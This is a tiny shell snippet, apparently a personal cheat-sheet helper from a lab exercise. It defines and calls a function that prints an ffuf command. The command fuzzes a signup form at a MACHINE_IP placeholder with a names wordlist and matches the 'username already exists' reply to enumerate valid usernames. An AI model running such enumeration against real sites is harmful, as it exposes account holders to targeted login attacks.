function help-ffuf {
echo "ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d \"username=FUZZ&email=x&password=x&cpassword=x\" -H \"Content-Type: application/x-www-form-urlencoded\" -u http://MACHINE_IP/customers/signup -mr \"username already exists\""
}

help-ffuf

# test